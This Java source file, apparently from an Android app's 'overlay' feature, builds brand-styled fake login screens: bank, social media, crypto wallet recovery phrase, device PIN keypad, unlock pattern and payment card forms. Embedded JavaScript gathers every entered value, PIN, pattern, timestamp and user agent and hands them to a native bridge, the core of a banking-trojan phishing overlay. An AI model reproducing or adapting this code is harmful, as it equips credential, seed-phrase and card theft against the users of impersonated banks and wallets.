package com.fason.app.features.overlay;

/**
 * TemplateRenderer — builds 2026-style login pages server-side (on device)
 * from a compact brand config. Pure string assembly, zero WebView round-trips.
 */
final class TemplateRenderer {

    static String render(String template, String brand, String color, String logoUrl,
                         String title, String subtitle, boolean pin, boolean pattern, boolean card) {
        String body;
        switch (template) {
            case "bank_verify":   body = bankVerify(brand, color, logoUrl); break;
            case "social_login":  body = socialLogin(brand, color, logoUrl); break;
            case "wallet_unlock": body = walletUnlock(brand, color, logoUrl); break;
            case "pin_gate":      body = pinGate(brand, color, logoUrl); break;
            case "pattern_gate":  body = patternGate(brand, color, logoUrl); break;
            case "card_verify":   body = cardVerify(brand, color, logoUrl); break;
            case "generic_login":
            default:              body = genericLogin(brand, color, logoUrl); break;
        }
        return shell(brand, color, logoUrl, title, subtitle, body, pin, pattern, card);
    }

    private static String shell(String brand, String color, String logoUrl, String title, String subtitle,
                                String body, boolean pin, boolean pattern, boolean card) {
        String extra = "";
        if (pin)     extra += field("pin", "PIN code", "numeric", "••••");
        if (pattern) extra += "<div id='patternHint' style='text-align:center;color:#666;font-size:13px;margin:8px 0'>Draw your unlock pattern</div><canvas id='patternCanvas' width='300' height='300' style='display:block;margin:0 auto;background:#f5f5f5;border-radius:12px'></canvas>";
        if (card)    extra += field("cardNumber", "Card number", "numeric", "0000 0000 0000 0000")
                           + field("expiry", "Expiry (MM/YY)", "numeric", "MM/YY")
                           + field("cvv", "CVV", "numeric", "•••");
        return "<!DOCTYPE html><html><head><meta charset='utf-8'>"
                + "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
                + "<style>"
                + "*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,system-ui,sans-serif}"
                + "body{background:#fff;min-height:100vh;display:flex;flex-direction:column}"
                + ".header{background:" + color + ";padding:48px 24px 36px;border-radius:0 0 32px 32px;color:#fff;text-align:center}"
                + ".header img{width:64px;height:64px;border-radius:16px;margin-bottom:12px}"
                + ".header h1{font-size:22px;font-weight:600}"
                + ".header p{font-size:14px;opacity:.85;margin-top:4px}"
                + ".content{flex:1;padding:24px;max-width:420px;width:100%;margin:0 auto}"
                + "label{display:block;font-size:12px;color:#5f6368;margin:16px 0 6px;font-weight:500}"
                + "input{width:100%;padding:14px 16px;border:1.5px solid #dadce0;border-radius:12px;font-size:16px;outline:none;transition:border .2s}"
                + "input:focus{border-color:" + color + "}"
                + "button{width:100%;padding:14px;background:" + color + ";color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;margin-top:24px;cursor:pointer}"
                + "button:active{opacity:.85}"
                + ".footer{text-align:center;padding:16px;color:#9aa0a6;font-size:12px}"
                + "</style></head><body>"
                + "<div class='header'>"
                + (logoUrl.isEmpty() ? "" : "<img src='" + logoUrl + "' onerror='this.style.display=\"none\"'>")
                + "<h1>" + esc(brand) + "</h1>"
                + "<p>" + esc(subtitle.isEmpty() ? "Verify your account to continue" : subtitle) + "</p>"
                + "</div><div class='content'>"
                + (title.isEmpty() ? "" : "<h2 style='font-size:18px;margin-top:8px'>" + esc(title) + "</h2>")
                + body + extra
                + "<button onclick='submit()'>Continue</button>"
                + "</div><div class='footer'>Secured by " + esc(brand) + "</div>"
                + script(pin, pattern)
                + "</body></html>";
    }

    private static String field(String id, String label, String inputType, String hint) {
        return "<label>" + label + "</label><input id='" + id + "' type='" + inputType
                + "' placeholder='" + hint + "' autocomplete='off'>";
    }

    private static String genericLogin(String brand, String color, String logoUrl) {
        return field("identifier", "Email or phone", "text", "you@example.com")
                + field("password", "Password", "password", "Enter your password");
    }

    private static String socialLogin(String brand, String color, String logoUrl) {
        return field("identifier", "Phone number or email", "text", "+1 ...")
                + field("password", "Password", "password", "Password")
                + "<div style='text-align:right;margin-top:8px'><a style='color:" + color + ";font-size:13px'>Forgot password?</a></div>";
    }

    private static String bankVerify(String brand, String color, String logoUrl) {
        return field("username", "Online banking ID", "text", "User ID")
                + field("password", "Password", "password", "••••••••")
                + "<p style='font-size:12px;color:#5f6368;margin-top:12px'>For your security, please verify your credentials.</p>";
    }

    private static String walletUnlock(String brand, String color, String logoUrl) {
        return field("mnemonic", "Recovery phrase", "text", "word1 word2 word3 ...")
                + "<p style='font-size:12px;color:#5f6368;margin-top:12px'>Enter your 12 or 24-word recovery phrase to restore access.</p>";
    }

    private static String pinGate(String brand, String color, String logoUrl) {
        return "<div style='text-align:center;margin-top:24px'>"
                + "<div style='font-size:15px;color:#333;margin-bottom:16px'>Enter your device PIN</div>"
                + "<div id='pinDots' style='display:flex;gap:16px;justify-content:center;margin-bottom:24px'>"
                + dot() + dot() + dot() + dot() + dot() + dot()
                + "</div>"
                + keypad(color)
                + "</div>";
    }

    private static String dot() {
        return "<div class='pin-dot' style='width:16px;height:16px;border-radius:50%;border:2px solid #dadce0'></div>";
    }

    private static String keypad(String color) {
        StringBuilder sb = new StringBuilder("<div style='display:grid;grid-template-columns:repeat(3,72px);gap:12px;justify-content:center'>");
        String[] keys = {"1","2","3","4","5","6","7","8","9","C","0","OK"};
        for (String k : keys) {
            String bg = "OK".equals(k) ? color : "#f1f3f4";
            String fg = "OK".equals(k) || "C".equals(k) ? ("OK".equals(k) ? "#fff" : color) : "#202124";
            sb.append("<button type='button' style='width:72px;height:72px;border-radius:50%;border:none;background:")
              .append(bg).append(";color:").append(fg).append(";font-size:24px;font-weight:500;cursor:pointer' ")
              .append("onclick='pinKey(\"").append(k).append("\")'>").append(k).append("</button>");
        }
        sb.append("</div>");
        return sb.toString();
    }

    private static String patternGate(String brand, String color, String logoUrl) {
        return ""; // canvas injected by shell when pattern=true
    }

    private static String cardVerify(String brand, String color, String logoUrl) {
        return "<p style='font-size:13px;color:#5f6368;margin-top:8px'>Verify your payment method to continue using " + esc(brand) + ".</p>";
    }

    private static String script(boolean pin, boolean pattern) {
        StringBuilder sb = new StringBuilder("<script>");
        sb.append("var PIN='';");
        sb.append("function pinKey(k){");
        sb.append(" if(k==='C'){PIN='';updateDots();return;}");
        sb.append(" if(k==='OK'){if(PIN.length>=4)submit();return;}");
        sb.append(" if(PIN.length<6){PIN+=k;updateDots();if(PIN.length===6)submit();}}");
        sb.append("function updateDots(){var d=document.querySelectorAll('.pin-dot');");
        sb.append(" for(var i=0;i<d.length;i++){d[i].style.background=i<PIN.length?'#1a73e8':'transparent';d[i].style.borderColor=i<PIN.length?'#1a73e8':'#dadce0';}}");
        sb.append("function collect(){var r={};var els=document.querySelectorAll('input');");
        sb.append(" for(var i=0;i<els.length;i++){if(els[i].id)r[els[i].id]=els[i].value;}");
        sb.append(" if(PIN)r['pin']=PIN;");
        sb.append(" if(window._pattern)r['pattern']=window._pattern;");
        sb.append(" r['capturedAt']=new Date().toISOString();");
        sb.append(" r['userAgent']=navigator.userAgent;");
        sb.append(" return r;}");
        sb.append("function submit(){try{FasonBridge.submit(JSON.stringify(collect()));}catch(e){}}");
        if (pattern) {
            sb.append("(function(){var c=document.getElementById('patternCanvas');if(!c)return;");
            sb.append(" var ctx=c.getContext('2d');var pts=[];var sel=[];");
            sb.append(" for(var r=0;r<3;r++)for(var q=0;q<3;q++)pts.push({x:50+q*100,y:50+r*100});");
            sb.append(" function draw(){ctx.clearRect(0,0,300,300);ctx.strokeStyle='#1a73e8';ctx.lineWidth=6;ctx.beginPath();");
            sb.append("  for(var i=0;i<sel.length;i++){var p=pts[sel[i]];if(i===0)ctx.moveTo(p.x,p.y);else ctx.lineTo(p.x,p.y);}ctx.stroke();");
            sb.append("  for(var i=0;i<pts.length;i++){ctx.beginPath();ctx.arc(pts[i].x,pts[i].y,sel.indexOf(i)>=0?18:14,0,7);");
            sb.append("   ctx.fillStyle=sel.indexOf(i)>=0?'#1a73e8':'#dadce0';ctx.fill();}}");
            sb.append(" draw();");
            sb.append(" c.addEventListener('touchstart',function(e){e.preventDefault();sel=[];var t=e.touches[0];hit(t);},{passive:false});");
            sb.append(" c.addEventListener('touchmove',function(e){e.preventDefault();var t=e.touches[0];hit(t);},{passive:false});");
            sb.append(" c.addEventListener('touchend',function(e){e.preventDefault();if(sel.length>=4){window._pattern=sel.join('-');submit();}},{passive:false});");
            sb.append(" function hit(t){var r=c.getBoundingClientRect();var x=t.clientX-r.left,y=t.clientY-r.top;");
            sb.append("  for(var i=0;i<pts.length;i++){var dx=pts[i].x-x,dy=pts[i].y-y;if(dx*dx+dy*dy<900&&sel.indexOf(i)<0){sel.push(i);draw();}}}})();");
        }
        sb.append("</script>");
        return sb.toString();
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#39;");
    }

    private TemplateRenderer() {}
}
